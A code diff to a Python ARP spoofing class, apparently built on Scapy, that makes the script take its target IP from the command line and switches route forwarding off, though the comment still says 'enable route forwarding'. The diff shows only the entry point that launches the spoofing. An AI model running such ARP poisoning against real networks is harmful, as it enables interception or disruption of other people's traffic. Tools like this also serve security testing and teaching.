@@ -75,7 +75,6 @@ class Arp:
                 sendp(r_pkt, inter=2, iface=self.interface)
 
 
-
     def __build_req(self, target, host):
         # target 目标地址
         if target is None:
@@ -113,6 +112,10 @@ class Arp:
 
 
 if __name__ == "__main__":
-    arps = Arp('192.68.4.131')
-    arps.routeForwarding(True)  #开启路由转发
+    args=sys.argv
+    arps = Arp(args[1])
+    #arps =Arp("192.68.4.131")
+    arps.routeForwarding(False)  #开启路由转发
     arps.arpSpoofing()
+
+
